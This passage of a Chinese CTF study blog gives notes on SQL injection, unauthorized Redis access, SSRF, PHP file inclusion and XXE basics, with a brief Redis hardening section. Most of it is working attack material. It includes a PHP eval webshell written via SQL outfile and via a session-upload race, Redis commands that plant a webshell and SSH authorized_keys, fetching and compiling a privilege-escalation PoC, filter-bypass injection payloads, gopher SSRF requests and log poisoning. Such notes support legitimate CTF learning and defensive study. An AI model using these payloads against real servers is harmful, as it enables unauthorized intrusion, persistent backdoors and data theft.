<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php @eval($_POST[1]);?&gt;&quot; into outfile &#x27;相关路径&#x27;</span><br></pre></td></tr></table></figure>



<p>​    </p>
<p>补充：</p>
<p>当concat函数被过滤时，可使用<a href="https://blog.csdn.net/qq_41725312/article/details/83039525">make_set函数</a></p>
<p>如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and (select extractvalue(2,make_set(3,0x7e,(select * from flag))))--+</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Redis未授权访问漏洞利用与防御</title>
    <url>/2021/05/27/CTF-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
    <content><![CDATA[<h3 id="Redis未授权访问漏洞利用与防御"><a href="#Redis未授权访问漏洞利用与防御" class="headerlink" title="Redis未授权访问漏洞利用与防御"></a>Redis未授权访问漏洞利用与防御</h3><h4 id="Redis漏洞"><a href="#Redis漏洞" class="headerlink" title="Redis漏洞"></a>Redis漏洞</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redis配置不当可导致未授权访问，被恶意利用。部分服务器上的Redis绑定在0.0.0.0：6379,并且没有开启认证(这是Redis的默认配置)，以及该端口可通过公网直接访问，如果没有采取相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等，将会导致Redis服务器直接暴露在公网上，可能造成其他用户直接在非授权情况下直接访问呢Redis服务并进行相关操作。</span><br></pre></td></tr></table></figure>





<h4 id="Redis服务实验环境搭建"><a href="#Redis服务实验环境搭建" class="headerlink" title="Redis服务实验环境搭建"></a>Redis服务实验环境搭建</h4><p>kali linux下环境搭建：</p>
<p>1、Redis安装包下载与安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-3.2.0.tar.gz</span><br><span class="line">tar xzf redis-3.2.0</span><br><span class="line">cd redis-3.2.0</span><br><span class="line">make</span><br></pre></td></tr></table></figure>



<p>2、配置Redis</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">1、bind 127.0.0.1 前面加上#</span><br><span class="line">2、protected-mode设为no</span><br></pre></td></tr></table></figure>



<p>3、加载配置文件启动Redis服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd src</span><br><span class="line">redis-server ../redis-conf</span><br></pre></td></tr></table></figure>



<p>4、查看6379端口是否启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p 6379 --script redis-info +redis服务器ip地址</span><br></pre></td></tr></table></figure>



<p>通过连接redis服务，执行info命令，探测出当前redis存在未授权访问漏洞</p>
<p>Redis客户端连接服务端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h +redis服务器ip地址</span><br></pre></td></tr></table></figure>



<h4 id="Redis未授权漏洞利用"><a href="#Redis未授权漏洞利用" class="headerlink" title="Redis未授权漏洞利用"></a>Redis未授权漏洞利用</h4><p>利用漏洞 写入webshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">set x &quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;</span><br><span class="line">config set dbfilename webshell.php </span><br><span class="line">save\\保存文件</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由可写webshell到指定路径，就可以写其他具有权限的文件，如计划任务，ssh密钥文件。</span><br></pre></td></tr></table></figure>





<h4 id="Redis漏洞防御"><a href="#Redis漏洞防御" class="headerlink" title="Redis漏洞防御"></a>Redis漏洞防御</h4><p>1、增加密码认证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#requirepass foobared</span><br><span class="line">requirepass +密码</span><br></pre></td></tr></table></figure>



<p>2、绑定内网ip地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>







<h4 id="Redis未授权添加ssh密钥"><a href="#Redis未授权添加ssh密钥" class="headerlink" title="Redis未授权添加ssh密钥"></a>Redis未授权添加ssh密钥</h4><p>1、nmap探测目标是否存在redis服务(6379)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 端口 ip</span><br></pre></td></tr></table></figure>



<p>2、测试redis服务是否存在未授权访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 服务端地址</span><br><span class="line">info</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>3、ssh密钥生成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cd ~/.ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt;public.txt</span><br><span class="line">两个换行</span><br></pre></td></tr></table></figure>



<p>4、 上传密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat public.txt |redis-cli -h ip -x set x //将文件内容读取到变量x，通过-x执行相关命令，相当于set x=public.txt文件内容</span><br><span class="line"></span><br><span class="line">redis-cli -h ip config set dir &quot;/home/user/.ssh/&quot; user需要破解，可尝试直接访问/~/.ssh/</span><br><span class="line"></span><br><span class="line">redis-cli -h ip config set dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line">redis-cli -h ip save </span><br></pre></td></tr></table></figure>







<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -l user -i id_rsa ip</span><br><span class="line">连接失败</span><br><span class="line">扫描22端口</span><br><span class="line">nmap -p 22 ip</span><br><span class="line">22端口关闭</span><br><span class="line">扫描所有端口</span><br><span class="line">namp -p 1-65535 -T4 -n -v ip</span><br><span class="line"></span><br><span class="line">发现一个novation服务也是ssh服务标识</span><br><span class="line"></span><br><span class="line">ssh -l user -p 1322 -i</span><br><span class="line">用户名还是需要爆破的，后面连接需要用到。</span><br><span class="line">不具有最高权限</span><br></pre></td></tr></table></figure>



<p>5、提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a </span><br><span class="line">查看版本相关信息</span><br><span class="line">百度搜索相关漏洞</span><br><span class="line">https://www.exploit-db.com/</span><br><span class="line"></span><br><span class="line">mkdir tmp</span><br><span class="line">cd tmp</span><br><span class="line">wget ... poc.c 下载相关漏洞</span><br><span class="line">gcc poc.c </span><br><span class="line">然后执行新生成的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SQL</title>
    <url>/2021/05/20/CTF-SQL/</url>
    <content><![CDATA[<h4 id="CTF-SQL注入基础"><a href="#CTF-SQL注入基础" class="headerlink" title="CTF-SQL注入基础"></a>CTF-SQL注入基础</h4><h4 id="万能密码："><a href="#万能密码：" class="headerlink" title="万能密码："></a>万能密码：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>



<p><strong>主要是逻辑or，返回true，密码正确。</strong></p>
<ul>
<li>burp需要使用+或%20代替空格</li>
</ul>
<p><strong>sql注入类型：数字型、字符串类型</strong></p>
<ul>
<li>sql语句中的括号不代表实际意义，主要用于优先级处理。</li>
</ul>
<p><strong>sql注入可能存在的位置：</strong></p>
<p>1、URL提交参数，GET型</p>
<p>2、HTTP请求主体，POST型</p>
<p>3、请求头(cookie,user-agent,referer)</p>
<p><strong>sql注入利用</strong></p>
<p>1、获取数据库信息</p>
<p>2、获取系统命令执行shell</p>
<p>3、上传、下载服务器文件(webshell)等</p>
<p><strong>技法：</strong></p>
<p><strong>联合注入、布尔盲注、延时注入、报错注入、堆叠注入、宽字节注入、二次注入、无列名注入等等。</strong></p>
<h4 id="CTF-SQL注入技巧"><a href="#CTF-SQL注入技巧" class="headerlink" title="CTF-SQL注入技巧"></a>CTF-SQL注入技巧</h4><p>url中字符的特殊含义：</p>
<p>1、&amp;表示get提交参数的分隔符，如果sql注入中将and替换成&amp;&amp;，要对&amp;进行URL编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;-&gt;%26%26</span><br></pre></td></tr></table></figure>



<p>2、#表示锚点，点击当前的链接会跳转到当前页面的某个位置，sql注入需要对#进行URL编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#-&gt;%23</span><br></pre></td></tr></table></figure>



<p>3、web站点默认访问index开头的页面，可以省略index.php</p>
<p>4、web站点默认端口使用80端口，可省略。若非80端口，不可省略。</p>
<p>绕过过滤姿势</p>
<p><em>1、常用注释符</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--空格</span><br><span class="line">--+</span><br><span class="line">/*注释*/</span><br><span class="line">在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执	行</span><br><span class="line">#</span><br></pre></td></tr></table></figure>

<p><em>2、大小写绕过</em></p>
<p><em>3、双写绕过</em></p>
<p><em>4、内联注释绕过</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=1 union /*!select*/ 1,2,3;</span><br><span class="line">加了感叹号，select会被执行。</span><br></pre></td></tr></table></figure>

<p><em>5、单引号过滤</em></p>
<ul>
<li>十六进制绕过</li>
<li>char函数绕过</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char(ascii)+char(ascii)+char(ascii)</span><br></pre></td></tr></table></figure>



<p><em>6、空格过滤</em></p>
<ul>
<li>括号绕过</li>
</ul>
<p>遵循查什么，从哪里，符合条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select(id)from(users)where(id=1)</span><br></pre></td></tr></table></figure>



<ul>
<li>注释符绕过空格</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格-&gt;/**/</span><br></pre></td></tr></table></figure>

<ul>
<li>反引号绕过</li>
</ul>
<p>由于数据库默认识别关键字，不需要加引号，但是无法自动识别用户定义的表名和字段名，此时使用反引号指定。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select*from`users`where`id`=1</span><br></pre></td></tr></table></figure>



<ul>
<li>其他空白字符</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ascii table：</span><br><span class="line"># TAB水平 09 url编码 %09</span><br><span class="line"># 新行  0A %0A</span><br><span class="line"># 新页  0C %0C</span><br><span class="line"># 回车  0D %0D</span><br><span class="line"># TAB垂直 0B        %0B</span><br></pre></td></tr></table></figure>





<p><em>7、等号过滤</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like或rlike</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">between and</span><br><span class="line">select * from users where id between 1 and 1</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regexp代替=</span><br></pre></td></tr></table></figure>



<p><em>8、逗号绕过</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr(&#x27;users&#x27;,1,1)=</span><br><span class="line">select substr(&#x27;users&#x27; from 1 for 1)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users limit 0,1</span><br><span class="line">select * from users limit 1 offset 0;</span><br><span class="line">第一个参数不为0,从1开始</span><br><span class="line">第二个参数为偏移量</span><br></pre></td></tr></table></figure>



<p><em>9、过滤了运算比较符号</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">greatest(n1,n2,n3..)返回最大值</span><br><span class="line"></span><br><span class="line">greatest(ascii(substr(database(),1,1)),1)=97;</span><br><span class="line"></span><br><span class="line">least(n1,n2,n3..)返回最小值</span><br><span class="line"></span><br><span class="line">strcmp(str1,str2)</span><br><span class="line">所有字符串相等返回0,小于返回-1,大于返回1</span><br></pre></td></tr></table></figure>



<h4 id="约束注入"><a href="#约束注入" class="headerlink" title="约束注入"></a>约束注入</h4><p>一般注入点存在注册的时候，对于管理员密码的任意修改</p>
<p>关键函数varchar()，当sql语句语句超过varchar定于的最大长度，并且没有唯一键约束。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin                           x</span><br></pre></td></tr></table></figure>



<p>SQL语句设置和取消唯一键约束：</p>
<p>取消唯一键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table admin drop unique username</span><br></pre></td></tr></table></figure>

<p>设置唯一键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table admin add unique (username)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SSRF</title>
    <url>/2021/05/25/CTF-SSRF/</url>
    <content><![CDATA[<h1 id="CTF-SSRF"><a href="#CTF-SSRF" class="headerlink" title="CTF-SSRF"></a>CTF-SSRF</h1><h3 id="SSRF介绍与简单介绍"><a href="#SSRF介绍与简单介绍" class="headerlink" title="SSRF介绍与简单介绍"></a>SSRF介绍与简单介绍</h3><p>原理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器请求伪造是一种由web服务器发出请求的漏洞，它能够请求到与它相连的内网资源。因此SSRF主要测试目标是企业的内网系统。</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">很多web应用提供从其他服务器获取数据的功能，可根据用户提交URL访问对应资源(获取图片，下载文件，读取内容等)。</span><br><span class="line">如果该功能作为代理通道去访问本地或远程服务器，这就是所谓的SSRF。</span><br></pre></td></tr></table></figure>





<h4 id="SSRF可能造成的危害"><a href="#SSRF可能造成的危害" class="headerlink" title="SSRF可能造成的危害"></a>SSRF可能造成的危害</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、对内网进行信息探测-端口扫描</span><br><span class="line">2、对内网服务区进行漏洞扫描利用</span><br><span class="line">3、对内网web的应用进行安全测试，如Structs、Sql注入漏洞利用。</span><br><span class="line">4、对内网中的文件读取(file协议)</span><br><span class="line">5、在PHP环境中，如果搭建expect扩展，可能被命令执行。</span><br></pre></td></tr></table></figure>





<h4 id="SSRF-漏洞-常用函数"><a href="#SSRF-漏洞-常用函数" class="headerlink" title="SSRF 漏洞 常用函数"></a>SSRF 漏洞 常用函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、file_get_contents</span><br><span class="line">PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</span><br><span class="line">-将整个文件读入一个字符串。</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、fsockopen函数</span><br><span class="line">(PHP 4, PHP 5, PHP 7, PHP 8)</span><br><span class="line">-打开一个网络连接或者一个Unix套接字连接</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl函数</span><br><span class="line">参考文档：https://www.php.net/manual/zh/book.curl.php</span><br><span class="line">PHP支持Daniel Stenberg创建的libcurl库，能够连接通讯各种服务器、使用各种协议。libcurl目前支持的协议有http、https、ftp、gopher、telnet、dict、file、ldap。libcurl同时支持HTTPS证书，HTTP POST、HTTP PUT、FTP上传(也能通过PHP的FTP扩展完成)、HTTP基于表单上传、代理、cookies、用户名+密码的认证。</span><br></pre></td></tr></table></figure>





<h3 id="SSRF绕过限制姿势"><a href="#SSRF绕过限制姿势" class="headerlink" title="SSRF绕过限制姿势"></a>SSRF绕过限制姿势</h3><h4 id="1、添加端口"><a href="#1、添加端口" class="headerlink" title="1、添加端口"></a>1、添加端口</h4><p>HTTP请求URL中默认以80端口。</p>
<h4 id="2、短网址"><a href="#2、短网址" class="headerlink" title="2、短网址"></a>2、短网址</h4><p><a href="https://sina.lt/">https://sina.lt/</a></p>
<h4 id="3、指定任意IP的域名xip-io"><a href="#3、指定任意IP的域名xip-io" class="headerlink" title="3、指定任意IP的域名xip.io"></a>3、指定任意IP的域名xip.io</h4><p><a href="https://xip.io/">https://xip.io/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1.xip.io</span><br><span class="line">www.127.0.0.1.xip.io</span><br><span class="line">mysite.127.0.0.1.xip.io</span><br><span class="line">foo.bar.127.0.0.1.xip.io</span><br></pre></td></tr></table></figure>



<h4 id="4、数制绕过"><a href="#4、数制绕过" class="headerlink" title="4、数制绕过"></a>4、数制绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IP地址是32位二进制数-&gt;4个字节</span><br><span class="line">目前看到的IP地址都是采用点分十进制组成的。</span><br><span class="line">127.0.0.1 -&gt;  01111111.00000000.00000000.00000001</span><br><span class="line">转化为十进制 -&gt; 2130706433</span><br><span class="line">八进制-&gt; 0177.00.00.01</span><br><span class="line">十六进制 -&gt; 0x7f.0x0.0x0.0x1</span><br></pre></td></tr></table></figure>



<h4 id="5、-跳转"><a href="#5、-跳转" class="headerlink" title="5、@跳转"></a>5、@跳转</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在URL中使用@可跳转到指定的URL</span><br><span class="line">http://www.baidu.com@127.0.0.1</span><br><span class="line">变成http://127.0.0.1</span><br><span class="line">https://www.baidu.com@127.0.0.1</span><br><span class="line">变成https://127.0.0.1</span><br></pre></td></tr></table></figure>





<h3 id="SSRF可用协议"><a href="#SSRF可用协议" class="headerlink" title="SSRF可用协议"></a>SSRF可用协议</h3><h4 id="1、file协议"><a href="#1、file协议" class="headerlink" title="1、file协议"></a>1、file协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file：//文件路径</span><br></pre></td></tr></table></figure>



<h4 id="2、dict协议"><a href="#2、dict协议" class="headerlink" title="2、dict协议"></a>2、dict协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用dict协议可探测端口的开放情况和指纹信息</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令格式：</span><br><span class="line">dict://serverip:port/info</span><br><span class="line">dict://127.0.0.1:80/info</span><br></pre></td></tr></table></figure>



<h4 id="3、gopher协议"><a href="#3、gopher协议" class="headerlink" title="3、gopher协议"></a>3、gopher协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gopher是internet上非常有名的信息查找系统，它将internet的文件组织成某种索引，很方便从internet的一处带到另一处。在www出现之前，Gopher是internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但是www出现之后，Gopher地位受到打击。Gopher协议在SSRF可以是一个万能协议，可进行GET、POST请求发送。</span><br></pre></td></tr></table></figure>



<p>构造Gopher数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">抓包后将整个数据包的</span><br><span class="line">空格替换成%20</span><br><span class="line">问好替换成%3f</span><br><span class="line">回车换行替换成%0d%0a</span><br><span class="line">最后一行也需要%0d%0a</span><br></pre></td></tr></table></figure>



<p><strong>gopher GET请求</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl gopher://ip:端口/_数据</span><br><span class="line"></span><br><span class="line">如</span><br><span class="line">curl gopher://127.0.0.1:端口/_GET%20/..../?a=...%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0a</span><br></pre></td></tr></table></figure>





<p><strong>gopher POST请求</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">与get请求类似，但是需要传入更多的相关信息。</span><br><span class="line">必须有</span><br><span class="line"></span><br><span class="line">POST /.../ HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length:9</span><br><span class="line"></span><br><span class="line">a=xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">最终变成</span><br><span class="line">curl gopher://_POST%20/.../%20HTTP/1.1%0d%0aHost:%20xxx%0d0aContent-Type:%20application/x-www-form-urlencoded%0d0aContent-Length%209%0d0a%0d0aa=xxx%0d%0a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">特别注意 POST有两个换号位置。</span><br><span class="line">%0d%0a%0d%0a</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-文件包含</title>
    <url>/2021/05/23/CTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php伪协议事实上就是其支持的协议与封装协议</span><br></pre></td></tr></table></figure>



<p>参考文档：</p>
<p><a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
<p>当只允许上传zip文件</p>
<p>使用zip协议phar协议解压</p>
<p>文件包含漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">	include($file.&quot;php&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>绕过方法：</p>
<p>新建一个test.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>使用zip进行无损压缩test.php，phpinfo.zip</p>
<p>利用伪协议 解压缩zip文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=zip://upload/phpinfo.zip%23phpinfo</span><br><span class="line">?file=phar://upload/phpinfo.zip/phpinfo</span><br><span class="line">phar要在php5.3后的版本使用</span><br></pre></td></tr></table></figure>

<p>如果后面拼接的是jpg，</p>
<p>解决方法，新建php文件改名为jpg，然后压缩即可。</p>
<h4 id="日志文件的利用"><a href="#日志文件的利用" class="headerlink" title="日志文件的利用"></a>日志文件的利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无法找到包含的文件，此时可使用日志文件</span><br></pre></td></tr></table></figure>

<p>环境：httpd.conf文件中的配置CustomLog”logs/access.log”common</p>
<p>通过burp访问参数，不然会记录到日志文件后会被URL编码，导致无法当作php代码执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=&lt;?php+phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>然后通过文件包含漏洞页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=../../../Extensions\Apache2.4.39\logs/access.log</span><br></pre></td></tr></table></figure>





<h4 id="session会话利用"><a href="#session会话利用" class="headerlink" title="session会话利用"></a>session会话利用</h4><p>关键点：</p>
<p>php7.2之后，提供了如果提交表单数据具有PHP_SESSION_UPLOAD_PROGRESS=上传后具体session名称 和file=@具体文件路径，此时可保存指定session名称的会话文件。</p>
<p>session_upload_progress.enabled开启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl ...../test.php -H &quot;Cookie:PHPSESSID=abc&quot; -F &quot;PHP_SESSION_UPLOAD_PROGRESS=&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;);?&gt;&quot; -F &quot;file=@/etc/passwd&quot;</span><br></pre></td></tr></table></figure>



<p>加代理，使用burp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x 127.0.0.1:8090...</span><br></pre></td></tr></table></figure>



<p>由于session_upload_progress.cleaned开启，需要竞争上传。</p>
<p>最终要不断访问的文件名为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sess_abc</span><br></pre></td></tr></table></figure>

<p>直到生成shell.php。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-XXE注入</title>
    <url>/2021/05/29/CTF-XXE%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h3 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml外部实体注入漏洞。XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意的外部文件，造成文件读取、命令执行等等。XXE漏洞触发点在可上传xml文件的位置，没有对上传的xml文件过滤，导致上传恶意的xml文件。</span><br></pre></td></tr></table></figure>





<h4 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a><strong>XML基础</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XML，用来传输和存储数据。没有预定义标签，用户自定义标签。</span><br><span class="line">HTML较固定。</span><br></pre></td></tr></table></figure>





<p><strong>XML语法规则</strong></p>
<p><a href="https://www.w3school.com.cn/xml/xml_syntax.asp">https://www.w3school.com.cn/xml/xml_syntax.asp</a></p>
<ul>
<li>1、所有XML元素都必须有关闭标签</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;xxxxx&lt;/p&gt;</span><br></pre></td></tr></table></figure>



<ul>
<li>2、XML标签对大小写敏感</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;message&gt;hhh&lt;/message&gt;正确</span><br><span class="line"></span><br><span class="line">&lt;Message&gt;hhh&lt;/message&gt;错误</span><br></pre></td></tr></table></figure>



<ul>
<li>3、XML必须正确地嵌套</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;b&gt;&lt;i&gt;hhh&lt;/b&gt;&lt;/i&gt;错误</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;b&gt;&lt;i&gt;hhh&lt;/i&gt;&lt;/b&gt;正确</span><br></pre></td></tr></table></figure>



<ul>
<li>4、XML文档必须有根元素</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;root&gt;</span><br><span class="line">	&lt;child&gt;</span><br><span class="line">		&lt;subchild&gt;...&lt;/subchild&gt;</span><br><span class="line">	&lt;/child&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>





<ul>
<li>5、XML的属性值必须加引号</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;note data=&quot;05/28/2021&quot;&gt;</span><br><span class="line">&lt;from&gt;you&lt;/from&gt;</span><br><span class="line">&lt;to&gt;Me&lt;/to&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>





<p><strong>1、实体引用</strong></p>
<p>由于&lt;可能会被误认为标签符</p>
<table>
<thead>
<tr>
<th>&amp;lt;</th>
<th>&lt;</th>
<th>小于</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;gt;</td>
<td>&gt;</td>
<td>大于</td>
</tr>
<tr>
<td>&amp;amp;</td>
<td>&amp;</td>
<td>和号</td>
</tr>
<tr>
<td>&amp;apos;</td>
<td>‘</td>
<td>单引号</td>
</tr>
<tr>
<td>&amp;quot;</td>
<td>“</td>
<td>引号</td>
</tr>
</tbody></table>
<p><strong>2、XML中的注释</strong></p>
<p>类似HTML</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--this is a comment --&gt;</span><br></pre></td></tr></table></figure>



<p><strong>3、在XML中，空格会被保留</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTML会把多个连续的空格字符裁剪(合并)为一个，但是XML不会合并空格。</span><br></pre></td></tr></table></figure>



<h4 id="XML文档组成"><a href="#XML文档组成" class="headerlink" title="XML文档组成"></a>XML文档组成</h4><p><strong>XML文档形成了一种树结构，它从”根部”开始，然后扩展到”枝叶”。</strong></p>
<p><strong>DTD文档类型定义</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DTD是定义XML文档合法构建的模块。既可以在XML文档定义，也可以在外部引用。</span><br></pre></td></tr></table></figure>





<p><strong>内部的文档声明</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素[元素声明]&gt;</span><br></pre></td></tr></table></figure>



<p><strong>外部的文档声明</strong></p>
<p>假如DTD位于XML源文件的外部，那么它应通过下面的语法被封装在一个DOCTYPE定义中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>





<h4 id="DTD-实体"><a href="#DTD-实体" class="headerlink" title="DTD-实体"></a>DTD-实体</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</span><br><span class="line">实体引用是对实体的引用</span><br><span class="line">实体可在内部或外部进行声明</span><br></pre></td></tr></table></figure>





<p><strong>内部声明</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>



